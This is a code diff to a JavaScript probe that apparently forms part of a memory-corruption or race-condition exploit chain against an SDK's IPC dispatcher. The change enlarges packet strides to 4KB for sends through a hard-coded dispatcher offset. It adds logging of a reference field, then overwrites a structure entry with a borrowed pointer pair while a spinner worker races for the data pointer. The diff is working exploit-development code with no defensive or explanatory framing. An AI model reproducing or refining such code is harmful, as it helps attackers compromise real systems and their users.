@@ -75,8 +75,13 @@ export async function spinReadProbe(context, title) {
     // Slab allocations (the arena has an entry-count cap ~400; per-packet
     // arenaAlloc calls exhaust it around round 59 regardless of size).
     // arenaAlloc returns BigInt addresses; keep all slab math BigInt.
-    const PKT_STRIDE = 0x100n, BUF_STRIDE = 0x40n;
-    const pktSlab = arenaAlloc(context, ROUNDS * 4 * 0x100, "sr-pkts");
+    // Packet stride MUST be 0x1000 and the SEND size 0x1000n: the SDK
+    // dispatcher (sdk+0x14ba90) relays a full 4KB message frame through
+    // TLS — run45's 0x100 packets/sizes made every spinner send fail
+    // (all-zero samples) while the same packets at 0x1000 worked in run39
+    // and in every wave SEND (orchestration.js).
+    const PKT_STRIDE = 0x1000n, BUF_STRIDE = 0x40n;
+    const pktSlab = arenaAlloc(context, ROUNDS * 4 * 0x1000, "sr-pkts");
     const bufSlab = arenaAlloc(context, ROUNDS * 2 * 0x40, "sr-bufs");
 
     const packets = [];   // {pkt, readBuf?}
@@ -97,14 +102,14 @@ export async function spinReadProbe(context, title) {
     const calls = [];
     for (const p of packets) {
         calls.push({fn: runtime.IPC_SEND_DISPATCHER,
-            args: [BigInt(cand), BigInt(p.wpktR), 0x100n, 0n]});
+            args: [BigInt(cand), BigInt(p.wpktR), 0x1000n, 0n]});
         calls.push({fn: runtime.IPC_SEND_DISPATCHER,
-            args: [BigInt(cand), BigInt(p.rpktR), 0x100n, 0n]});
+            args: [BigInt(cand), BigInt(p.rpktR), 0x1000n, 0n]});
         bufs.push({field: "ref", buf: p.bufR});
         calls.push({fn: runtime.IPC_SEND_DISPATCHER,
-            args: [BigInt(cand), BigInt(p.wpktE), 0x100n, 0n]});
+            args: [BigInt(cand), BigInt(p.wpktE), 0x1000n, 0n]});
         calls.push({fn: runtime.IPC_SEND_DISPATCHER,
-            args: [BigInt(cand), BigInt(p.rpktE), 0x100n, 0n]});
+            args: [BigInt(cand), BigInt(p.rpktE), 0x1000n, 0n]});
         bufs.push({field: "entry20", buf: p.bufE});
     }
     const frame = runtime.buildRawFrame(calls);
@@ -114,6 +119,10 @@ export async function spinReadProbe(context, title) {
     // The second borrow-copy, with the spinner racing the command only.
     const oldPair = await readFs(context, entry20, 0x10);
     const borrowPair = await readFs(context, target.entry + 0x20, 0x10);
+    const refBefore = await readFs(context, refField, 8)
+        .then(b => readU32LE(b, 0));
+    await khLog("SR0 spin " + ROUNDS + " rounds ref=" + hex(refBefore) +
+        " entry20=" + hex(Number(readU64LE(oldPair, 0))));
     await writeFs(context, entry20, borrowPair);
     ep.pointer = null;   // the spinner now owns the data pointer
     const worker = runtime.launchRawWorker(BigInt(frame.frame), scheduling);
